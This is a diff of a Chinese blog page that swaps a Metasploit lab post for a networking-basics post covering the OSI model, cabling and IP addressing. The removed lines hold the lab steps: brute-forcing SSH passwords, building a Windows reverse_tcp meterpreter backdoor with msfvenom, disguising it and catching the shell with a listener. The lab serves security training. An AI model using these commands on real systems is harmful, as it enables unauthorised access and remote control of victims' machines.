@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现,">
+  <meta name="keywords" content="网络基础,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="MSF实验利用msf爆破ssh服务密码">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="网络（一）ISP:运营商，电信、移动、联通IEEE：国际电子电气工程师协会，致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空ISO（国际标准化组织）网络设备：交换（实现相同网段通信）和路由器（找路，实现不同网段通信）IP：标识网络中任意一台主机的位置（收发件人的地址）">
+<meta name="keywords" content="网络基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSF实验">
-<meta property="og:url" content="blog.shenzihao.top/2019/08/10/MSF实验/index.html">
+<meta property="og:title" content="网络一">
+<meta property="og:url" content="blog.shenzihao.top/2019/08/24/网络一/index.html">
 <meta property="og:site_name" content="changyouB-log">
-<meta property="og:description" content="MSF实验利用msf爆破ssh服务密码">
+<meta property="og:description" content="网络（一）ISP:运营商，电信、移动、联通IEEE：国际电子电气工程师协会，致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空ISO（国际标准化组织）网络设备：交换（实现相同网段通信）和路由器（找路，实现不同网段通信）IP：标识网络中任意一台主机的位置（收发件人的地址）">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-11T05:59:23.487Z">
+<meta property="og:updated_time" content="2019-08-24T07:04:46.446Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MSF实验">
-<meta name="twitter:description" content="MSF实验利用msf爆破ssh服务密码">
+<meta name="twitter:title" content="网络一">
+<meta name="twitter:description" content="网络（一）ISP:运营商，电信、移动、联通IEEE：国际电子电气工程师协会，致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空ISO（国际标准化组织）网络设备：交换（实现相同网段通信）和路由器（找路，实现不同网段通信）IP：标识网络中任意一台主机的位置（收发件人的地址）">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="blog.shenzihao.top/2019/08/10/MSF实验/">
+  <link rel="canonical" href="blog.shenzihao.top/2019/08/24/网络一/">
 
 
 
 
 
-  <title>MSF实验 | changyouB-log</title>
+  <title>网络一 | changyouB-log</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/10/MSF实验/">
+    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/24/网络一/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="申子昊">
@@ -262,12 +262,12 @@
     </span>
 
      <span title="Words count in article">
-     1.9k 字
+     2.4k 字
      </span>
 
         ...
      <span title="Reading time">
-     7 分钟
+     9 分钟
      </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -279,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MSF实验</h1>
+          <h1 class="post-title" itemprop="name headline">网络一</h1>
         
 
         <div class="post-meta">
@@ -291,8 +291,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-10T11:39:25+08:00">
-                2019-08-10
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-24T10:14:36+08:00">
+                2019-08-24
               </time>
             
 
@@ -328,7 +328,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1.9k
+                  2.4k
                 </span>
               
 
@@ -344,7 +344,7 @@
                   <span class="post-meta-item-text">Reading time </span>
                 
                 <span title="Reading time">
-                  7
+                  9
                 </span>
               
             </div>
@@ -365,63 +365,36 @@
       
 
       
-        <h1 id="MSF实验"><a href="#MSF实验" class="headerlink" title="MSF实验"></a>MSF实验</h1><h2 id="利用msf爆破ssh服务密码"><a href="#利用msf爆破ssh服务密码" class="headerlink" title="利用msf爆破ssh服务密码"></a>利用msf爆破ssh服务密码</h2><a id="more"></a>
+        <h1 id="网络（一）"><a href="#网络（一）" class="headerlink" title="网络（一）"></a>网络（一）</h1><p><strong>ISP</strong>:运营商，电信、移动、联通<br><strong>IEEE</strong>：国际电子电气工程师协会，致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空<br><strong>ISO</strong>（国际标准化组织）<br><strong>网络设备</strong>：交换（实现相同网段通信）和路由器（找路，实现不同网段通信）<br><strong>IP</strong>：标识网络中任意一台主机的位置（收发件人的地址）</p>
+<a id="more"></a>
 
-<p>一、    实验目的</p>
-<ol>
-<li>了解SSH的概念</li>
-<li>理解MSF爆破SSH的工作原理</li>
-<li>掌握MSF爆破SSH服务密码的方法<br>二、    实验要求</li>
-<li>根据实验指导书，完成msf爆破ssh服务密码的实验操作。</li>
-<li>编制msf爆破ssh服务密码的实验报告，验证实验过程。<br>三、    实验原理<br>SSH是一种网络协议，用于计算机之间的加密登录。<br>如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。<br>最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。<br>需要指出的是，SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是OpenSSH，它是自由软件，应用非常广泛。<br>通过kali中的msf对我们具有ssh服务的服务器进行账号密码的爆破，从而让我们可以远程登录这台具有ssh服务的服务器</li>
-</ol>
-<p>四、    实验环境<br>Kali linux, centos<br>用户名：root<br>密码：sahoo@123<br>五、    实验操作<br>步骤一：    先打开msf</p>
-<p>步骤二：<br>作为我们的攻击机，我们利用msf这款工具来对ssh协议服务的账号密码进行爆破，输入msfconsole命令以开启msf这款工具</p>
-<p>步骤三：    然后我们用search ssh命令来查找相应的对ssh服务的一些攻击模块，其中划红箭头的是我们所需要的利用模块</p>
-<p>步骤四：    然后我们直接use这个模块，对这个模块的相关参数进行设置</p>
-<p>步骤五：    然后我们show options查看相应的参数设置，其中划红线的就是我们所需要设置的一些模块，RHOSTS是目标主机的ip，RPORT是目标主机开放ssh服务的相应端口，PASS_FILE是我们所需要的爆破密码的字典，USER_FILE使我们所需要的爆破用户名的字典，THREADS是我们爆破的线程，也可以理解为速度的快慢</p>
-<p>设置我们的目标主机的ip是192.168.78.129</p>
-<p>设置我们的目标主机开放ssh服务的端口 </p>
-<p>设置我们的线程为最大值5，这也是msf默认允许的最大的线程值</p>
-<p>步骤六：    字典的话我们可以自己用kali自带的crunch工具来生成，生成一个名为a.txt文件中，那么a.txt文件就是一个我们的字典，但是由于线程数非常的小，而且我们这次主要是以实验为主要目的，于是我们可以用网上一些较小的字典，来节省爆破的时间<br> 设置我们的密码的字典为桌面的pass.txt</p>
-<p>设置我们的用户名的字典为桌面的user.txt</p>
-<p>步骤七：    然后我们再次show options查看相应的设置是否完成</p>
-<p>步骤八：    设置完成后我们就直接exploit进行爆破，然后等待结果即可</p>
-<p>步骤九：    当爆破成功一个后，就会如此提示我们，并且提示我们已经成功的与目标主机建立了一个会话</p>
-<p>步骤十：    然后我们输入sessions 来查看这次会话的信息</p>
-<p>步骤十一：    然后我们用爆破出来的密码来进行ssh登录目标主机，可以看到我们进入了root用户的终端shell界面，当然我们也可以在我们刚才的msf中输入sessions -i 1来进入meterpreter界面从而输入shell来进入同样的终端界面，这两种方式都是可以的</p>
-<p>六、    实验结论<br>请按要求完成实验报告，并按时提交给老师。<br>实验效果验证</p>
-<p>七、    课后拓展<br>1.两种shell登录方式都试一下</p>
-<p>八、    先序课程</p>
-<ol>
-<li><p>《密码攻击-字典的生成》</p>
 <hr>
-<h2 id="metasploit之后门的生成"><a href="#metasploit之后门的生成" class="headerlink" title="metasploit之后门的生成"></a>metasploit之后门的生成</h2><p>后门简介<br>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。<br>metasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
-<p>KALI ip 192.168.10.128<br>WIN7 ip 10.0.2.2 </p>
-<p>选择以下攻击载荷并生成一个exe的木马程序</p>
-<p>命令msfconsole 开启Metasploit</p>
-<p>查看payload，使用命令show payloads，msf提供了多种攻击载荷<br>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序<br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe<br>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
+<p><strong>1.网络</strong>：两个不在同一地理位置的主机，通过传输介质和通信协议，以实现资源共享和数据传输。<br>  （1）传输介质：<br>  （2）通信协议：“语言”，设备之间交流使用的语言叫做“协议”<br>  （3）资源共享：文本类、视频、音频、图片等<br>  （4）终端：笔记本、台式机、平板、手机等<br><strong>2.网络的分类</strong>：按照范围分<br>  （1）WAN（Wide Area Network）：广域网，典型代表Internet，还有VPN（虚拟私有网络–“隧道”）<br>  （2）LAN(Local Area Network)：局域网，“内网”，比如：家庭网、企业网、园区网等<br>  （3）MAN：城域网</p>
+<p><strong>3.网络拓扑</strong>：是一个网络的架构描述；方便管理和查看网络结构。<br>  星型：组网灵活、方便扩展和管理；但是中心节点一旦发生故障，就会全网瘫痪。<br>  全网型拓扑：每个设备都和其他设备相连，任意一个节点坏掉都不影响其他设备的通信。<br>        缺点：成本太高。<br>  部分网状型：有2个（或以上）性能比较好的设备来做“冗余（多余）”，防止网络故障。</p>
+<p><strong>4.OSI七层参考模型</strong>：由ISO组织提出的OSI七层模型。<br>  最开始的网络厂商是不兼容的，不能直接对接。<br>  为了促进各厂商的融合，ISO组织提出了OSI（Open System Interconnection，OSI）七层模型<br>  OSI七层就是定义了数据在传输过程中如何进行“封装”（打包）和“解封装”（拆包）<br>  <strong>（1）物理层</strong>：定义了终端设备的传输介质。传输的是bit流。<br>  <strong>（2）数据链路层</strong>：把bit流转换为数据帧，实现基于mac地址的寻址和转发。<br>  <strong>（3）网络层</strong>：把数据帧转换为数据包，实现基于IP地址的寻址和转发。<br>  （<strong>4）传输层</strong>：把数据包转换为数据段，为数据提供可靠或者不可靠的传输；为应用程序提供端到端的服务。<br>       netstat  -an      //查看端口和连接情况<br>  <strong>（5）会话层</strong>：用来建立、维持、管理和终止会话<br>  <strong>（6）表示层</strong>：数据的表现形式，比如加密和压缩<br>  <strong>（7）应用层**</strong>：为用户提供服务。</p>
+<p><strong>5.TCP/ip模型</strong>：也叫做TCP/IP协议栈。可以说是4层，也可以说是5层<br>  4层：<br>  <strong>网络接口层</strong>：物理层和数据链路层<br>  <strong>网络层</strong>：把数据帧转换为数据包，实现基于IP地址的寻址和转发。<br>  <strong>传输层</strong>：把数据包转换为数据段，为数据提供可靠或者不可靠的传输；为应用程序提供端到端的服务。<br>  <strong>应用层</strong>：把会话、表示层和应用层合并为一层。</p>
+<hr>
+<p><strong>1.物理层</strong>：定义了终端设备的传输介质。传输的是bit流。<br>  常见的物理介质：网线、光纤、同轴线缆<br><strong>2.以太网中的术语</strong><br>  <strong>（1）广播</strong>：一对多；讲课<br>  <strong>（2）组播</strong>：一对多，只有同一组里的主机才能接收到；群聊<br>  <strong>（3）单播</strong>：一对一<br>  <strong>（4）全双工</strong>：同一时刻，可以同时进行发送（上传）和接收（下载），比如手机<br>  <strong>（5）半双工</strong>：同一时刻，只能发送或者接收数据，比如对讲机<br>  <strong>（6）单工</strong>：只能进行单向传输，比如收音机<br>  <strong>（7）冲突域</strong>：一个冲突影响的范围就是冲突域。<br>  <strong>（8）广播域</strong>：一个广播影响的范围就是广播域。</p>
+<p><strong>3.同轴线缆</strong>：传输速度快，但是只有一根芯，半双工的工作模式。<br>  应用：电视、监控等<br>  同轴线缆：100Base-2（细线，理论上可以传输185m）和100Base-5（粗线，理论上可以传输500m）</p>
+<p><strong>4.光纤</strong>：单模光纤和多模光纤<br>  单模光纤：只能传输一种光，传输距离更远<br>  多模光纤：可以传输多种光。</p>
+<p><strong>5.网线</strong>：在以太网中常见的传输介质，网线的理论值能传输100M。<br>  <strong>（1）从结构上来分</strong>：屏蔽双绞线（有锡纸，适合室外布线）和非屏蔽双绞线（适合室内布线）<br>  <strong>（2）从传输速率来分</strong>：<br>        CAT5:5类线，传输速率的100M（百兆以太网）<br>        cat6:6类线，传输速率为1000M（千兆以太网）<br>        CAt7:7类线或者超6类，传输速率为10G（万兆以太网）<br>  <strong>（3）按照网线的排序</strong>：T568A和T568B<br>        T568B：橙白、橙、绿白、蓝、蓝白、绿、棕白、棕<br>        T568B在100M以太网中，使用了4根，1,2用于发送；3,6用于接收。<br>        T568A是1,3对调；2,6对调；<br>  <strong>（4）按照一根线的两端网线的连接方式</strong>：<br>        如果一根线的两端都是T568B，这种线叫做“直通线”——————不同种设备之间用直通线<br>        如果一根线一端是T568B，一端是T568A，这种线的连接方式叫做“交叉线”————同种设备之间用交叉线<br>        全反线，也叫做Console线，用来对设备进行配置。</p>
+<p><strong>6.不管是什么传输介质，在传输数据的时候，信号都会出现衰减，这个时候需要使用设备来延长信号的传输距离物理层的设备：hub（集线器），只能识别bit流。</strong><br>    由于内部是总线型结构，网络的传输效率特别低。<br>    hub没有学习功能；<br>    hub的每个接口都是一个冲突域；</p>
+<ol start="7">
+<li><p><strong>带宽：单位时间内传输数据的速度</strong><br>默认单位：bit/s<br>计算机最开始的时候只能识别0和1.每个0或1就是一个bit（位）。<br>为了方便计算机读取，把每 8  bit==1 Byte（容量单位）。<br>1Byte=8bit<br>1KB==1024B<br>1MB=1024KB<br>1GB=1024MB<br>1TB=1024GB<br>一个2G（GB）电影，使用100M（bit/s）的带宽，需要多长时间下载完成？<br>2*1024=2048MB<br>100/8=12.5B/s </p>
+<p>2.73min</p>
+<p><strong>1.进制：</strong><br>二进制B ：  0  1<br>八进制O ：  0  1  2  3  4  5  6  7<br>十进制D ：  0  1  2  3  4  5  6  7  8  9<br>十六进制H ：0  1  2  3  4  5  6  7  8  9  A（10）   B（11）  C（12）   D（13）  E（14）  F（15） </p>
 </li>
 </ol>
-<p>   使用命令 cd /，可以看到我们生成的exe文件</p>
+<p><strong>2.把1-F转换为二进制：</strong><br>  十六进制     二进制<br>  0            0<br>  1            1<br>  2            10<br>  3            11<br>  4            100<br>  5         101<br>  6            110<br>  7            111<br>  8            1000<br>  9            1001<br>  10        1010<br>  11        1011<br>  12        1100<br>  13        1101<br>  14        1110<br>  15        1111</p>
+<p><strong>3.十进制转其他进制：短除法</strong><br>  把这几个数转换为二进制<br>  128=10000000<br>  192=11000000<br>  224=11100000<br>  240=11110000<br>  248=11111000<br>  252=11111100<br>  254=11111110<br>  255=11111111</p>
+<p>  2的0次方=1<br>  2的1次方=2<br>  2的2次方=4<br>  2的3次方=8<br>  2的4次方=16<br>  2的5次方=32<br>  2的6次方=64<br>  2的7次方=128<br>  2的8次方=256<br>  2的9次方=512<br>  2的10次方=1024</p>
+<p>  <strong>十进制转八进制：</strong><br>  479<br>  640    1200<br>  1200        2260<br>  1024        2000<br>  512        1000</p>
+<p>  <strong>十进制转十六进制：</strong><br>  1600        640<br>  3216        C90<br>  4801        12C1<br>  2048        800</p>
+<p><strong>4.其他进制转十进制：乘法</strong><br>十六进制：ABC  B00<br>八进制：  501  234<br>二进制：  1       0    1   0    1  0  0  0 =168<br>          128  64  32   16   8  4  2  1    </p>
+<p><strong>5.IP地址：分别是Ipv4和Ipv6.</strong><br>  <strong>（1）其中IPv4是由32位的二进制数组成，为了读写方便，用点分十进制表示。IPV4的地址空间是42亿。IPv6是由128位的二进制数组成，为了读写方便，用冒号分十六进制表示。</strong><br>  （2<strong>）IPv4中按照用途把地址分为2大类：公网地址和私网地址</strong><br>        <strong>公网地址</strong>：是互联网上使用，具有全球唯一性。<br>        <strong>私网地址</strong>：在以太网中可以重复使用。<br>        <strong>10.0.0.0————10.255.255.255   子网掩码：255.0.0.0</strong>（简写10.0.0.0/8，这里的8代表子网中“1”的个数）<br>        <strong>172.16.0.0————172.31.255.255    子网掩码：255.255.0.0</strong><br>        <strong>192.168.0.0————192.168.255.255  子网掩码：255.255.255.0</strong><br>  <strong>（3）IP地址的分类：</strong><br>       <strong>A类：1——126，默认子网掩码是255.0.0.0；地址范围：1.0.0.0————126.255.255.255</strong><br>       <strong>B类：128——191，默认子网掩码是255.255.0.0；地址范围：128.0.0.0————191.255.255.255</strong><br>       <strong>C类：192——223，默认子网掩码是255.255.255.0；地址范围：192.0.0.0————223.255.255.255</strong><br>       <strong>D类：224——239，用于组播</strong><br>       <strong>E类：240——255，用于科研</strong><br>  <strong>（4）子网掩码：用来标识Ip地址中的网络位和主机位的。</strong><br>       <strong>网络位：在Ip地址中，与子网掩码“1”（二进制）对应的是网络位</strong><br>       <strong>主机位：在Ip地址中，与子网掩码“0”（二进制）对应的位是主机位。</strong><br>       <strong>**网络地址：在Ip地址中，如果“主机位”全为0，这个地址就是网络地址。====》路由器找路的时候使用</strong><br>       <strong>广播地址：在Ip地址中，如果“主机位”全为1，这个地址就是广播地址。====》同一个网络中广播的时候使用</strong><br>       说明：网络地址和广播地址不能直接在网络中进行配置。**</p>
+<p><strong>6.家用路由器的基本功能；</strong><br>  <strong>（1）路由的功能</strong>：为数据包寻找一条最优路径；————找路<br>  <strong>（2）地址转换功能</strong>：把私网地址转化为公网地址；————WAN口（宽带的用户名和密码校验成功，才会给用户分配公网Ip）<br>  <strong>（3）DHCP功能</strong>：为客户端分配Ip/子网/网关/DNS</p>
+<p><strong>数据链路层的代表设备：交换机</strong></p>
 <hr>
-<p>   接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
-<hr>
-<p>   为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。<br>   在kali linux上打开ssh服务的方法：<br>   apt-get install openssh-server#安装<br>   一、配置SSH参数<br>   修改sshd_config文件，命令为：<br>   vi /etc/ssh/sshd_config<br>   将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes<br>   右击桌面，单击打开终端，输入命令<br>   将PermitRootLogin without-password修改为<br>   PermitRootLogin yes<br>   二、启动SSH服务<br>   命令为：<br>   /etc/init.d/ssh start<br>   或者<br>   service ssh start<br>   查看SSH服务状态是否正常运行，命令为<br>   /etc/init.d/ssh status<br>   或者service ssh status<br>   那么需要生成两个密钥：<br>   ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key<br>   ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key</p>
-<p>   执行命令后都会让输入密码，直接敲回车设置为空即可</p>
-<p>   Win7关闭防火墙的方法</p>
-<hr>
-<p>   接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
-<hr>
-<hr>
-<p>   在msf中设置监听<br>   use exploit/multi/handler </p>
-<p>   show options </p>
-<p>   设置我们后门生成时的攻击载荷<br>   set payload windows/meterpreter/reverse_tcp<br>   show options<br>   set payload windows/meterpreter/reverse_tcp</p>
-<p>   payload =&gt; windows/meterpreter/reverse_tcp</p>
-<p>   设置参数（与后门的参数相对应）<br>   msf exploit(multi/handler) &gt; set LHOST 192.168.10.128<br>   LHOST =&gt; 192.168.10.128<br>   msf exploit(multi/handler) &gt; set LPORT 4444<br>   LPORT =&gt; 4444</p>
-<p>   msf exploit(multi/handler) &gt; run</p>
-<p>   在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程<br>   序时，会弹回一个shell<br>   [<em>] Started reverse TCP handler on 192.168.10.128:4444<br>   [</em>] Sending stage (179779 bytes) to 192.168.10.1<br>   [<em>] Sleeping before handling stage…<br>   [</em>] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
-<p>   实验结束</p>
 
       
     </div>
@@ -439,7 +412,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
+            <a href="/tags/网络基础/" rel="tag"># 网络基础</a>
           
         </div>
       
@@ -452,8 +425,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/10/权限维持实验/" rel="next" title="权限维持实验">
-                <i class="fa fa-chevron-left"></i> 权限维持实验
+              <a href="/2019/08/20/双杀Oday复现/" rel="next" title="CVE20188174-双杀0day漏洞复现">
+                <i class="fa fa-chevron-left"></i> CVE20188174-双杀0day漏洞复现
               </a>
             
           </div>
@@ -462,8 +435,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/10/xss实战/" rel="prev" title="xss实战">
-                xss实战 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/24/网络二/" rel="prev" title="网络二">
+                网络二 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -617,7 +590,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF实验"><span class="nav-number">1.</span> <span class="nav-text">MSF实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用msf爆破ssh服务密码"><span class="nav-number">1.1.</span> <span class="nav-text">利用msf爆破ssh服务密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit之后门的生成"><span class="nav-number">1.2.</span> <span class="nav-text">metasploit之后门的生成</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网络（一）"><span class="nav-number">1.</span> <span class="nav-text">网络（一）</span></a></li></ol></div>
             
 
           </div>
